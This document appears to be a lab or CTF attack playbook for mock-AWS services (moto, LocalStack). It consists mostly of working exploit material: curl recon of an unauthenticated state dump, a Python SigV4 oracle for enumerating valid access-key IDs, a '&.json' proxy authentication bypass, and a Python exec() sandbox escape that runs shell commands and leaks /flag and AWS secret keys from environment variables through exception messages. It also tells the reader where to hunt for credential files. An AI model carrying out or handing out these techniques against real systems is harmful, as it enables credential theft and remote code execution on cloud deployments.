# Mock-AWS (moto / motoserver) — Recon Quirks & AKIA Enumeration Oracle

## When this applies

A target exposes an AWS-compatible API endpoint behind one of the lab's vhosts (e.g., `cloud.<DOMAIN>`, `aws.<DOMAIN>`, `localstack.<DOMAIN>`). Telltale fingerprints:

- `Server: Werkzeug/2.x Python/3.x` (moto's default WSGI runtime), OR `Server: hypercorn-h11`.
- Static `RequestId` like `e9110237-adc4-11e6-92e0-8b00d85af153` in error bodies (moto's hard-coded default).
- Account ID `000000000000` in successful responses.
- Default region behavior — accepting `af-south-1` or other non-standard regions without complaint.
- An unauthenticated diagnostic endpoint `/moto-api/data.json` returns a JSON blob.

This scenario covers the unique recon surface mock-AWS endpoints expose vs. real AWS and a side-channel oracle for enumerating valid access-key IDs without the secret.

## Technique

Two mock-AWS-specific behaviors are useful for recon BEFORE you have any credential:

1. **`/moto-api/data.json` exposes the in-memory resource graph** with sensitive types selectively stripped, but counters still leak.
2. **The IAM error type distinguishes "unknown AKIA" from "known AKIA + wrong secret"** — exactly the side channel you need to verify guesses against a small candidate set without risking signature replay.

## Steps

### 1. Fingerprint the mock-AWS endpoint

```bash
# Look for the diagnostic endpoint
curl -sk -H "Host: <SUSPECTED_VHOST>" "http://<TARGET_IP>/moto-api/data.json" | head -c 500
# Successful = a JSON object with keys like {"iam": [], "ec2": [...], "s3": [...]}

# Confirm the static RequestId tell
curl -sk -X POST -H "Host: <SUSPECTED_VHOST>" "http://<TARGET_IP>/" \
  -d 'Action=ListUsers&Version=2010-05-08' \
  | grep -oE '<RequestId>[^<]+</RequestId>'
# RequestId 'e9110237-adc4-11e6-92e0-8b00d85af153' is moto's hard-coded default
```

### 2. Pull the unauth state dump

```bash
curl -sk -H "Host: <VHOST>" "http://<TARGET_IP>/moto-api/data.json" -o moto_state.json
jq 'keys' moto_state.json
jq '.iam | length' moto_state.json   # usually 0 (filtered)
```

What the filter strips vs. what survives:

| Stripped (empty arrays even when populated) | Surfaces (useful for recon) |
|---|---|
| `iam.User`, `iam.AccessKey`, `iam.Policy`, `iam.Role`, `iam.ManagedPolicy` | `iam.AccountSummary` — leaks COUNTS (`Users=N`, `Policies=M`) |
| `awslambda.*` (function code + env vars) | `cloudformation` stack list (stack names, status — sometimes empty if resources made via direct API) |
| `apigateway.*` (stage configs, integrations) | `ec2.*` baseline state (default VPCs, subnets, SGs — typically populated with moto defaults) |
| `dynamodb2.*` (table data) | Hard-coded account ID `000000000000` |
| `s3.FakeBucket`, `s3.FakeKey` | Region(s) configured (often non-standard) |
| `secretsmanager.*` | |

`AccountSummary.Users` is the gold — it confirms how many IAM users exist even though their names are stripped. Cross-reference with any leaked CloudFormation template you have on the file system to pin down the username list.

### 3. AKIA enumeration oracle (no secret required)

```python
# tools/moto_akia_oracle.py
import hashlib, hmac, datetime, urllib.parse, requests, re, sys

VPN = '<TARGET_IP>'; HOST = '<VHOST>'; REGION = '<REGION>'; SERVICE = 'iam'

def sigv4(akia, sk, action='ListUsers'):
    body = urllib.parse.urlencode({'Action': action, 'Version': '2010-05-08'})
    t = datetime.datetime.utcnow(); amz = t.strftime('%Y%m%dT%H%M%SZ'); ds = t.strftime('%Y%m%d')
    canonical = (f'POST\n/\n\n'
                 f'content-type:application/x-www-form-urlencoded; charset=utf-8\n'
                 f'host:{HOST}\nx-amz-date:{amz}\n\n'
                 f'content-type;host;x-amz-date\n{hashlib.sha256(body.encode()).hexdigest()}')
    scope = f'{ds}/{REGION}/{SERVICE}/aws4_request'
    sts = f'AWS4-HMAC-SHA256\n{amz}\n{scope}\n{hashlib.sha256(canonical.encode()).hexdigest()}'
    k = ('AWS4' + sk).encode()
    for x in (ds, REGION, SERVICE, 'aws4_request'):
        k = hmac.new(k, x.encode(), hashlib.sha256).digest()
    sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
    headers = {'Host': HOST, 'X-Amz-Date': amz,
               'Authorization': f'AWS4-HMAC-SHA256 Credential={akia}/{scope}, SignedHeaders=content-type;host;x-amz-date, Signature={sig}',
               'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'}
    r = requests.post(f'http://{VPN}/', headers=headers, data=body, timeout=10)
    code = re.search(r'<Code>([^<]+)</Code>', r.text)
    return code.group(1) if code else 'OK'

# Iterate candidate AKIAs — deliberately wrong secret on every probe
for akia in [f'AKIA{u.upper():0<16}'[:20] for u in ('JOHN','WILL','REBECCA','ROY','ADMIN')]:
    print(f'{akia} → {sigv4(akia, "WRONGSECRET")}')
```

Interpret the response codes:

| Returned `<Code>` | Meaning | Action |
|---|---|---|
| `InvalidClientTokenId` | The AKIA isn't registered in this IAM backend | Move on |
| `SignatureDoesNotMatch` | The AKIA EXISTS — only the signature failed | Record this AKIA; the corresponding secret is what you need next |
| `ValidationError` | Body shape wrong (not auth-related) | Fix the body, retry |
| `TokenRefreshRequired` | (Real AWS path) — unlikely on moto | Treat as InvalidClientTokenId |

The 20-character base32 keyspace makes random brute infeasible, but targeted guesses are O(1) each. Combine with whatever username list you have to test deterministic AKIA patterns: `AKIA + UPPERCASE_USERNAME + filler`, `AKIA + base32(username)`, or whatever the lab's seed script used.

### 4. After a hit — pivot

Once one AKIA shows `SignatureDoesNotMatch`, the secret is needed. Real ways to get it:

- Filesystem hunt on any host that uses this mock-AWS as a client (look for `~/.aws/credentials`, env vars `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`, `boto3` session arguments in source).
- Workflow / DAG runner state (Airflow Connections table, Jenkins credential store, Kubernetes Secret).
- The lab's "leaks log" — many CTF labs DNS-tunnel the SECRET through a controlled domain; check accessible log aggregators for `AKIA...sk...` patterns base64'd into subdomain labels.

## Verifying success

- `aws --endpoint-url http://<VHOST> --no-verify-ssl iam list-users` with the real key returns the expected user list.
- The `AccountSummary` count you read from `/moto-api/data.json` matches `iam list-users | jq '.Users|length'`.
- `aws sts get-caller-identity` returns the AKIA's ARN.

## Common pitfalls

- moto's WSGI host strips the URL fragment but echoes it back in some endpoints — a `#` in your URL can break SigV4's canonical request hash. Strip fragments before signing.
- moto often accepts ANY `region` value; the candidate region you sign with must MATCH the one stored on the account, otherwise the IAM endpoint may serve a different backend instance (moto's "region buckets"). Try every plausible region (`us-east-1`, `af-south-1`, `eu-west-1`).
- `--no-sign-request` does NOT bypass moto's auth check (unlike LocalStack in some configurations). The error path is identical to an invalid AKIA.
- `/moto-api/reset` would wipe state — never call it on a live engagement. Treat all `/moto-api/*` paths as read-only.

## Tools

- `aws-cli` (>= 2.x). Always pass `--endpoint-url http://<VHOST>` for mock-AWS.
- `boto3` with `endpoint_url=` kwarg.
- Python `hmac` + `hashlib` for the manual SigV4 oracle above — no boto required.

### 5. Apache / Werkzeug routing-suffix bypass (`&.json` trick)

LocalStack / moto stacks are often fronted by an Apache or Werkzeug proxy that layers a SigV4 auth gate in front of the AWS-compatible backend. When the proxy decides *what to route* based on a content-type or URL-suffix match (rather than canonicalizing the query string first), a junk query suffix like `&.json` can bypass the auth gate and hit the backend unauthenticated.

```bash
# Baseline: blocked at the proxy
curl -sk "http://<VHOST>/<BUCKET>/<KEY>"
# 403 / "missing authentication token"

# Suffix bypass — proxy treats it as a passthrough JSON-API call
curl -sk "http://<VHOST>/<BUCKET>/<KEY>?&.json"
# → file contents
```

Endpoints worth re-probing with the suffix once you find one path that bypasses:

| Endpoint pattern | What it leaks |
|---|---|
| `/<bucket>/<key>` | Object contents (sqlite/`.db` dumps, source archives, configs) |
| `/<bucket>/?list-type=2` | Bucket key listing |
| `/2015-03-31/functions/<fn>/code` | Lambda code download URL (then GET the signed link) |
| `/restapis/<api_id>/<stage>/_user_request_/<path>` | Direct invocation of an API-Gateway-fronted Lambda |
| `/moto-api/data.json` | Already unauth on most stacks, but the suffix also works |

Why predecessors miss this: the bypass only changes the *query string*. SigV4 validators flag the request as malformed, but the proxy short-circuits BEFORE handing off to SigV4 once the suffix matches its routing regex. Test variants — `?&.json`, `?.json`, `?x=y&.json`, `?&.xml` — different proxy implementations match different patterns.

### 6. Lambda `exec()` sandbox escape with empty `__builtins__`

When a Lambda handler does `exec(user_input, {'__builtins__': {}})` (or `eval` with a stripped namespace), the empty builtins block obvious calls (`open`, `__import__`, `os`) but Python's class hierarchy is still reachable through any literal.

Universal escape via `catch_warnings._module`:

```python
# From inside the sandbox — reach os via the class graph
[c for c in ().__class__.__mro__[-1].__subclasses__()
 if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('id').read()
```

If the handler suppresses stdout (`exec` returns `None`), exfil via **KeyError reflection** — any thrown exception's `__repr__` typically lands in the JSON error body or stack trace:

```python
# Force the secret into a thrown exception
({})[__import__('os').popen('cat /flag').read()]
# Response body: KeyError: 'flag_value_here'
```

Pair with the `&.json` bypass above for unauthenticated invocation:

```bash
curl -sk "http://<VHOST>/restapis/<api_id>/<stage>/_user_request_/<route>?&.json" \
  --data-urlencode "cmd=({})[__import__('os').environ['AWS_SECRET_ACCESS_KEY']]"
```

After confirming command exec, dump `os.environ` via KeyError exfil — Lambda env vars routinely hold DB passwords, AKIA/SK pairs, signed-URL bases, and backend service tokens.

## Related

- [recon-and-iam-privesc.md](recon-and-iam-privesc.md) — once you have a working AKIA, full enumeration + privesc.
- [minio-self-hosted-s3.md](minio-self-hosted-s3.md) — adjacent class: self-hosted S3 with its own credential model.
- [../../../../authentication/reference/scenarios/password-attacks/password-spraying.md](../../../../authentication/reference/scenarios/password-attacks/password-spraying.md) — when leaked S3 DBs hand you plaintext creds, spray cross-protocol before chasing app exploits.
